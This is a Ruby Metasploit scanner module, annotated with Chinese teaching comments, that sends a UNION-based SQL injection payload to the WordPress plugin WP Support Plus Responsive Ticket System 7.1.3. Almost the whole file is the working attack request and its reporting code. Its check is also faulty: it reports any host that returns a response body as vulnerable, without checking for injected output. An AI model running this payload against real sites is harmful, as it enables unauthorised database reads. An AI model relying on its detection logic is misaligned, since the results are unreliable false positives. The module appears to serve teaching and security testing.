#引入库
require 'msf/core' #每个msf module必须引入此库
require 'uri'       
#继承的类
class MetasploitModule < Msf::Auxiliary 

#引入的module
  include Msf::Exploit::Remote::HTTP::Wordpress  
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report


  def initialize(info = {})
#利用模块的基本信息(名称，描述)
    super(update_info(info,
      'Name'        => 'WordPress Contus WP Support Plus Responsive Ticket System 7.1.3 SQL Injection Scanner',
      'Description' => %q{ 
      This module attempts to exploit a UNION-based SQL injection in WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3
      },
      'Author'       =>
        [
          'Lenon Leite', #漏洞发现人
        ],
#必须填写此许可
      'License'     => MSF_LICENSE,
#漏洞数据库的编号
      'References'  =>
        [
         
          [ 'EDB', '40939' ]
         
        ],
#漏洞公布时间
      'DisclosureDate' => 'Dec 16 2016'))
#根据测试目录设置目标url
    register_options([
      OptString.new('TARGETURI', [true, 'Target URI', '/'])
    ], self.class)
  end

  def run_host(ip)
    vprint_status("Checking host")

#发送请求
    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, '/'),
      'vars_get' => {
#构造sql注入语句
      	'action' => "wpsp_getCatName",
        'cat_id' => "0 UNION SELECT 1,CONCAT(name,CHAR(58),slug),3 FROM wp_terms WHERE term_id=1"
      }
    })
    unless res && res.body
      vprint_error("Server did not respond in an expected way")
      return
    end
#输出结果
      print_good("Vulnerable to SQL injection within WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3")
      report_vuln({
        :host  => rhost,
        :port  => rport,
        :proto => 'tcp',
        :name  => "SQL injection in WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3",
        :refs  => self.references.select { |ref| ref.ctx_val == "40939" }
      })
   end
end